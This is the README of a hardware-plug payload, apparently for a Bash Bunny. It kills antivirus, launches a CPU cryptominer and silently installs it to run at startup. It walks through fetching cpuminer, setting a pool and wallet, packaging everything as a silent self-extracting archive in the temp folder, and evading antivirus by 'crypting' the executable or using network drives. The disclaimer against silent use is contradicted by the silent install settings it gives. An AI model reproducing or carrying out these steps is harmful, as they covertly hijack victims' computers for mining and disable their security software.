################### Configuration ####################

How it works:

 The bunny will start by killing AV and after that it will run a non-silent process of the cpu miner and then silently install 
 the miner with all its files to your pc for startup.I cannot teach you how to run the miner silently.Please do not add silence when contributing to it.

CONFIGURATION:
STEP 1:

 You will need to go to:
 https://github.com/tpruvot/cpuminer-multi/releases
 
 This payload was tested with version 1.3 But you may try to use version  1.3.1 or above.
 Direct link to version 1.3:
 
 https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3-multi/cpuminer-multi-rel1.3.zip
 
 Extract the EXE's and use the x86 (32Bit) version due to its support for both 32Bit and 64Bit CPU.
 Add "cpuminer-x86.exe" and "msvcr120.dll" to the payload folder.
 Rename the exe to 2.exe
 
STEP 2:

#Please change the credentials in "config.txt" to this format:
 <algorithim>
 <pool stratum>
 <username/wallet>
 <cores/threads>
 
 Example: 

cryptonight
stratum+tcp://fcn-xmr.pool.minergate.com:45590
equalizercolander@protonmail.com
4
(Check step 2 for more info)
STEP 3:
#Change the start.bat to your own credentials!!
 
#Currently start.bat runs the following as an example:
 
 2 -a cryptonight -o stratum+tcp://fcn-xmr.pool.minergate.com:45590 -u equalizercolander@protonmail.com -p x -t 2
  
** 2 is the EXE name
** -a cryptonight (do not change that)
** -o stratum (change that to whatever you wish to mine)

########### Creating the self-installing EXE #########

STEP 4:

Select the following:

1. install.vbs
2. setup.bat
3. start.vbs
4. start.bat
5. msvcr120.dll
6. 2.exe

 Use WinRAR to create a new archive
 with them. Use the following options:

 Select Compression Method = best
 Select Create SFX archvive

 Now go to tab “Comment” and paste the following lines:


Path=%temp%
SavePath
Setup="%temp%\install.vbs"
Silent=1
Overwrite=1

Once Done,rename the archive to PersBunnyMiner.exe
DONE!!

FAQ:

#WHY EDIT 2 FILES, config.txt and start.bat?

config.txt is for the miner that will launch immeadiatly when the bunny is plugged.
start.bat will be the one used when the pc boots.
i will later work on reducing the required steps for the payload to work.


#Is this payload Detectable by Antivirus?
AVs might detect this. This can be evaded by using custom miners or by "modifying" the 2.exe (crypting)
TIP: AVs can't scan network drives ;)


#How can i tell if the miner installed and will run at boot?
Opening task manager will show the app running every time the pc starts up.
I will be including a script that cleans the miner once installed.
